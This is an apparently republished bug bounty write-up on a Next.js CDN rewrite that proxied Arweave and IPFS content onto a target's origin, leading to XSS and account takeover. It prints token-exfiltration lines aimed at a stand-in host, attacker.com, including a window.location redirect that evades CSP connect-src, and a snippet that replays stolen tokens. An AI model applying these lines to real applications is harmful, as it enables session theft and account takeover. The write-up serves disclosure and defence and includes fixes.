# How a Next.js CDN Proxy Turned Into a One-Click Account Takeover

- **Source URL:** https://medium.com/@r3dd404/how-a-next-js-cdn-proxy-turned-into-a-one-click-account-takeover-dd8bc8dd9fde
- **Fetched from:** https://medium.com/feed/@r3dd404
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14996 (id 14996)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
A Next.js rewrite rule proxied decentralized storage content through the target’s origin. Since the storage network is permissionless — anyone can upload HTML — an attacker could serve arbitrary JavaScript on the application’s domain, bypassing CSP, stealing auth tokens from localStorage, and achieving full account takeover. CVSS 9.3 Critical.

### Recon — Reading the Source

I pulled the open-source repo and started reading next.config.ts. Most bug hunters skip config files — they’re chasing API endpoints and input fields. But config files are where architectural decisions live, and architectural decisions are where critical bugs hide.

A specific block caught my eye immediately — the rewrites() function:

```
async rewrites() {
  return [
    { source: '/cdn/arweave/:path*', destination: 'https://arweave.net/:path*' },
    { source: '/cdn/ipfs-io/:path*', destination: 'https://ipfs.io/:path*' },
    // ... other CDN proxies (Cloudinary, etc.)
  ];
}
```
Next.js rewrites act as a reverse proxy — when a user visits /cdn/arweave/anything, Vercel fetches [https://arweave.net/anything](https://arweave.net/anything) and serves the response **as if it came from the application’s own domain**. Same origin. Same cookies. Same localStorage.

The other CDN proxies (Cloudinary, etc.) were safe — they only serve images. But Arweave and IPFS are **permissionless storage networks**. Anyone can upload anything, including HTML with JavaScript.

### The Key Insight — The Raw Endpoint

My first attempt didn’t work. Visiting target.com/cdn/arweave/{txid} for an HTML transaction triggered a redirect to a sandboxed subdomain. Safe.

But Arweave has a /raw/ endpoint that serves content directly with no redirect. So:

- target.com/cdn/arweave/{txid} → redirects to sandboxed subdomain (safe)
- target.com/cdn/arweave/raw/{txid} → serves raw HTML on target’s origin (exploitable)

I found existing HTML transactions on Arweave using their GraphQL API, filtering for Content-Type: text/html. Navigated to one via the proxy — and the HTML rendered directly on the target’s domain.

### CSP? Not a Problem

The Content Security Policy included:

script-src 'self' 'unsafe-inline' 'unsafe-eval' ...

‘unsafe-inline’ means inline script tags execute freely. ‘self’ means scripts from the target’s domain are allowed — and our proxied Arweave page IS the target’s domain. CSP was completely bypassed.

### Token Storage — The Jackpot

The auth provider stores session tokens in localStorage:

- auth:token — JWT (session token)
- auth:refresh\_token — refresh token
- auth:pat — personal access token

All readable by any JavaScript running on the target’s origin. No HttpOnly flag protection — localStorage has no equivalent of that security feature.

This is the fundamental problem with storing auth tokens in localStorage versus HttpOnly cookies. HttpOnly cookies are invisible to JavaScript by design. localStorage is wide open to any same-origin script.

### Building the Exploit

I uploaded a crafted HTML page to Arweave (free via their upload tools) that:

1. Shows a convincing “Verifying Your Submission” loading page (social engineering layer)
2. Reads all auth tokens from localStorage
3. Base64 encodes them into a compact payload
4. Redirects to an attacker-controlled server via window.location
5. Server captures the tokens and redirects the victim back to the application

The victim experience: click link → brief loading screen → back on the platform. They notice nothing. The attacker has their full session.

### Exfiltration — Bypassing connect-src

This part was the most interesting technically. CSP’s connect-src directive blocks fetch() and XMLHttpRequest to external domains. So I couldn’t simply do:

`fetch('https://attacker.com', { body: JSON.stringify(tokens) })`
But CSP **cannot restrict window.location navigation**. The browser has to allow the user to navigate to any URL — otherwise the entire web breaks. So the exfiltration becomes:

window.location = 'https://attacker.com/?d=' + btoa(JSON.stringify(tokens));

The attacker’s server logs the URL parameters (which contain all the tokens), then issues a 302 redirect back to the target platform. Seamless round trip.

This is a pattern worth remembering: **CSP connect-src protects network requests but not navigation**. Any data that fits in a URL parameter can be exfiltrated via redirect, regardless of CSP configuration.

### Proving Account Takeover

With the stolen tokens, full ATO is trivial — open a different browser, paste the tokens into localStorage, reload:

```
localStorage.setItem('auth:token', stolen_jwt);
localStorage.setItem('auth:refresh_token', stolen_refresh);
localStorage.setItem('auth:pat', stolen_pat);
location.reload();
// Now logged in as the victim
```
I verified the hijacked session could:

- Read the victim’s full PII via the user API endpoint (200 OK)
- Access internal dashboards (200 OK)
- Modify account settings including wallet addresses for crypto payouts (200 OK)
- Submit work and claim bounties as the victim

### The Permanent Payload Problem

Here’s what elevates this from “bad XSS” to “critical”: Arweave is **immutable storage**. Once data is uploaded, it exists forever. The exploit page cannot be taken down, deleted, or modified — not by the attacker, not by Arweave, not by anyone.

Even after the target patches their rewrite rules, the payload sits on Arweave waiting. If the rewrite is ever re-introduced (say, during a rollback or by a new developer who doesn’t know the history), the attack becomes live again instantly.

### Impact Summary

- **Any logged-in user** who clicks a link gets their full session stolen
- **Permanent payload** — immutable storage means the exploit page can never be deleted
- **No user interaction beyond one click** — the page looks legitimate and auto-exfiltrates
- **Full ATO** — attacker gets complete access to the victim’s account, PII, and crypto payouts
- **Mass-exploitable** — same link works against every user

CVSS: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N → **9.3 Critical**

### The Fix

The simplest fix: remove the Arweave and IPFS rewrite rules entirely. If proxying is required for functionality, alternatives include:

1. Serve proxied content with Content-Type: text/plain or Content-Disposition: attachment to prevent browser rendering
2. Use a separate domain (e.g., cdn-proxy.example.com) that shares no origin with the main application
3. Render proxied content in a sandboxed iframe with a null origin

The program acknowledged the finding as Critical on the same day it was reported and removed the CDN rewrite rules.

### Key Takeaways for Hunters

**1. Read the config files.** next.config.ts, nginx proxy\_pass, Apache ProxyPass, Vercel vercel.json rewrites — anywhere an app proxies external content onto its own origin is a potential XSS vector. This is an underexplored attack surface because most hunters focus on user input, not infrastructure routing.

**2. Permissionless storage + origin proxy = XSS.** Arweave, IPFS, Filecoin, and similar networks let anyone upload anything. Proxying them through your domain is literally proxying attacker-controlled content through your origin. The CDN proxy pattern is common in Web3 — check every project that displays on-chain content.

**3. localStorage tokens are XSS loot.** Unlike HttpOnly cookies, localStorage has zero protection against same-origin JavaScript. If the auth system stores tokens in localStorage, any XSS equals full account takeover. This is a design tradeoff many modern auth providers make for convenience — and it creates a larger blast radius for every XSS finding.

**4. CSP doesn’t block navigation.** connect-src restricts fetch and XHR, but window.location redirects are unrestricted by any CSP directive. Data exfiltration via URL parameters on redirect always works, regardless of how strict the CSP is. Keep this technique in your toolkit.

**5. Check alternate endpoints.** Arweave’s standard endpoint redirects to a sandboxed subdomain, which would have been safe. The /raw/ endpoint bypasses this entirely. Many services have alternative access patterns — always enumerate and test all paths, not just the documented happy path.

**6. Immutable storage amplifies severity.** A traditional XSS payload hosted on a server can be taken down. A payload on Arweave exists forever. When evaluating severity, consider whether the attack infrastructure can be neutralized — if not, that’s an aggravating factor.

### Final Thought

This entire chain started from three lines in a config file. No fuzzing, no fancy tooling, no automation — just reading code with an adversarial mindset. The best bugs often live not in the application logic, but in the architectural decisions that set up the application’s boundaries. Those boundaries are your attack surface.

Stay curious, start hacking.

— **R3DD**

**X: @R3DD404**

**Discord: @R3DD404**
